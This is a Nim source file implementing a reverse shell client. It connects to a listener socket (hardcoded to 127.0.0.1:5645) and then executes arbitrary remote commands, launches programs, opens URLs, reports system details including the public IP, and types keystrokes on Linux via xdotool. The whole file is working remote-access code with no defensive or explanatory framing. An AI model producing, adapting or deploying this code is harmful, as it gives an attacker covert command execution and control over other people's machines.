import net, httpclient, os, osproc, strformat, strutils, browsers

type EKeyboardInterrupt = object of CatchableError

proc handler() {.noconv.} =
  raise newException(EKeyboardInterrupt, "Keyboard Interrupt")

setControlCHook(handler)

var
    ip = "127.0.0.1"
    port = Port(5645)
    s = newSocket()
    DIR = os.getCurrentDir()

try:
    s.connect(ip, port)
    s.send(&"Connected from a {hostOS} machine" & "\n")
    s.send(&"{DIR}> ")
    while true:
        let message = s.recvLine()
        var args = message.split(' ')

        if message.startsWith("cd"):
            if os.dirExists(args[1]): os.setCurrentDir(args[1]);s.send(&"{DIR}> ") else: s.send("Error: directory not found")
        
        elif message.startsWith("run"):
            case hostOS:
                of "windows":
                    discard os.execShellCmd(&"start {args[1]}")
                of "linux":
                    discard os.execShellCmd(&"{args[1]} &")
            s.send(&"{DIR}> ")

        elif message.startsWith("url-open"):
            openDefaultBrowser(args[1])
            s.send(&"{DIR}> ")

        elif message == "sys-infos":
            let
                client = newHttpClient()
                os = hostOS
                cpu_arch = hostCPU
                
            let ip = client.getContent("https://api.ipify.org")
            let infos = &"""
Operating System    =   {os}
CPU architecture    =   {cpu_arch}
IP address          =   {ip}
"""
            s.send(infos)
            s.send(&"{DIR}> ")

        elif message == "exit":
            s.send("Session ended")
            break

        elif message.startsWith("write"):
            case hostOS:
                of "linux":
                    args.delete(0)
                    discard os.execShellCmd(&"""xdotool type '{args.join(" ")}' """)
                    s.send(&"{DIR}> ")
                
                of "windows":
                    s.send("Error: No implementation for windows systems, help is needed here!")
                    s.send(&"{DIR}> ")

        else:
            let output = execCmdEx(message)
            s.send(output[0])
            s.send(&"{DIR}> ")


except EKeyboardInterrupt:
    s.send("\n" & "Interrupted by ^C")
    quit(0)

except:
    quit(1)

finally:
    s.send("Session ended")
    s.close()